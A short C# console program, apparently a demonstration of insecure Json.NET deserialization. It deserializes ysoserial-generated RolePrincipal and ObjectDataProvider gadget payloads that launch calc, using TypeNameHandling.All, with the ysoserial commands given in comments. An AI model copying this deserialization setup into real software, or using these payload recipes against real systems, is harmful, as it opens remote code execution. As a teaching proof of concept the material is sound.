using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using Newtonsoft.Json;
using Newtonsoft.Json.Serialization;
using Todo.Models;

namespace JsonConsole
{
    internal class Program
    {
        static void Main(string[] args)
        {

            Dog fido = new Dog
            {
                Name = "Fido",
                Breed = "Golden Retriever",
                Owner = "John Doe"
            };

            string dogString = SerializeJsonObject(fido);

            // {
            // "$type": "Todo.Models.Dog, Todo.Models",
            // "name": "Fido",
            // "breed": "Golden Retriever",
            // "owner": "John Doe"
            // }

            // ysoserial.exe -f Json.Net -g RolePrincipal -o raw -c "calc"
            string jsonRolePrincipalPayload = File.ReadAllText("RolePrincipalExploit.json");

            try
            {

                object rolePrinicpalExploited = DeserializeJsonObject<object>(jsonRolePrincipalPayload);
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex);
            }

            // ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
            string jsonObjectDataProviderPayload = File.ReadAllText("ObjectDataProviderExploit.json");

            try
            {

                object roleObjectDataProviderExploited = DeserializeJsonObject<object>(jsonObjectDataProviderPayload);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }

        }

        private static string SerializeJsonObject<T>(T obj)
        {

            return JsonConvert.SerializeObject(obj, Formatting.Indented, new JsonSerializerSettings
            {
                ContractResolver = new CamelCasePropertyNamesContractResolver(),
                TypeNameHandling = TypeNameHandling.All
            });
        }

        private static T DeserializeJsonObject<T>(string json)
        {
            return JsonConvert.DeserializeObject<T>(json, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.All
            });
        }
    }
}
